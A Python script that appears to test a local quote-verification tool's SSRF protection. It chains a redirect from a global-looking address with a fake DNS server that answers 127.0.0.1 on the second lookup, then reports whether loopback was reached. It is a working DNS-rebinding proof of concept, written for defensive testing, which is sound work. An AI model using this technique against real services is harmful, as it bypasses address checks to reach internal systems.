#!/usr/bin/env python3
"""Full SSRF chain in a private netns.

registry URL = http://93.184.216.34:PORT1/doc   (a globally-scoped address that is
             served locally inside the namespace, so the tool's *initial* URL
             passes its address check)
that host answers 302 Location: http://rebind.test:PORT2/ok
DNS answers rebind.test with a global address on the first query (policy check)
             and 127.0.0.1 on the second (http.client's connect-time resolution)
the loopback server then serves the page.

If the tool reports VERBATIM and the loopback server logs a request, the chain
"any public registry host redirect -> loopback" is proven.
"""
import os
import socket
import struct
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
TOOL = "/home/vgpnk/Projects/shokunin/chousa-shokunin/tools/quote-reopen.py"
FIRST = "93.184.216.34"
GLOBAL_V6 = "2804:14d:5c56:36ef:fe9d:5ff:fe5e:5dbe"
PORT1, PORT2 = 45801, 45802

dns_log, http_log, hop_log = [], [], []
stop = threading.Event()


def dns_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 53))
    s.settimeout(0.5)
    counts = {}
    while not stop.is_set():
        try:
            data, peer = s.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        off = 12
        while off < len(data) and data[off] != 0:
            off += 1 + data[off]
        qname_end = off
        qend = qname_end + 5
        qtype = struct.unpack("!H", data[qname_end + 1:qname_end + 3])[0]
        counts[qtype] = counts.get(qtype, 0) + 1
        total = sum(counts.values())
        first = total <= 2
        q = data[12:qend]
        if qtype == 28:
            addr = GLOBAL_V6 if first else "::1"
            rdata = socket.inet_pton(socket.AF_INET6, addr)
            rtype = 28
        else:
            addr = FIRST if first else "127.0.0.1"
            rdata = socket.inet_pton(socket.AF_INET, addr)
            rtype = 1
        ans = b"\xc0\x0c" + struct.pack("!HHIH", rtype, 1, 60, len(rdata)) + rdata
        resp = data[:2] + b"\x81\x80" + struct.pack("!HHHH", 1, 1, 0, 0) + q + ans
        try:
            s.sendto(resp, peer)
        except OSError:
            pass
        dns_log.append((counts[qtype], qtype, addr))


def http_server(port, body_hook, log):
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", port))
    ls.listen(16)
    ls.settimeout(0.5)
    while not stop.is_set():
        try:
            conn, peer = ls.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        log.append(peer)
        try:
            conn.settimeout(5)
            conn.recv(65536)
            conn.sendall(body_hook())
        except OSError:
            pass
        finally:
            conn.close()
    ls.close()


def main():
    page = b"<html><body>alpha beta gamma delta</body></html>"
    redirect_body = (b"HTTP/1.1 302 Found\r\nLocation: http://rebind.test:%d/ok\r\n"
                     b"Content-Length: 0\r\n\r\n" % PORT2)
    ok_body = (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s"
               % (len(page), page))

    threading.Thread(target=dns_server, daemon=True).start()
    threading.Thread(target=http_server, args=(PORT1, lambda: redirect_body, hop_log),
                     daemon=True).start()
    threading.Thread(target=http_server, args=(PORT2, lambda: ok_body, http_log),
                     daemon=True).start()
    time.sleep(0.6)

    # The first hop is served on a globally-scoped address that is routed locally.
    hop = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hop.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    hop.bind((FIRST, PORT1))
    hop.listen(16)
    hop.settimeout(0.5)
    stop2 = threading.Event()

    def hop_loop():
        while not stop2.is_set():
            try:
                conn, peer = hop.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            hop_log.append(peer)
            try:
                conn.settimeout(5)
                conn.recv(65536)
                conn.sendall(redirect_body)
            except OSError:
                pass
            finally:
                conn.close()
        hop.close()

    threading.Thread(target=hop_loop, daemon=True).start()

    reg = os.path.join(HERE, "reg_chain.tsv")
    itf = os.path.join(HERE, "items_chain.tsv")
    with open(reg, "w") as f:
        f.write("| id | source | kind | tier | scope | anchor | teaches | status | opened | recheck | used-by |\n")
        f.write("| S001 | Doc http://%s:%d/doc | spec | A | s | a | t | mined | 2026-10-22 | 365d | n |\n"
                % (FIRST, PORT1))
    with open(itf, "w") as f:
        f.write("id\tsource_id\tquote\ni1\tS001\talpha beta gamma delta\n")

    t0 = time.monotonic()
    p = subprocess.run([sys.executable, TOOL, "verify", "--items", itf, "--registry", reg],
                       capture_output=True, timeout=90)
    el = time.monotonic() - t0
    print("exit=%d elapsed=%.1fs" % (p.returncode, el))
    print("stdout:", p.stdout.decode("utf-8", "replace").strip().replace("\n", " | "))
    err = p.stderr.decode("utf-8", "replace").strip()
    if err:
        print("stderr:", err.replace("\n", " | "))
    print("dns answers: %r" % (dns_log,))
    print("first-hop connections: %d" % len(hop_log))
    print("LOOPBACK connections accepted: %d %r" % (len(http_log), http_log))
    print("SSRF-CHAIN-SUCCEEDED" if http_log else "SSRF-CHAIN-BLOCKED")
    stop.set()
    stop2.set()


if __name__ == "__main__":
    main()
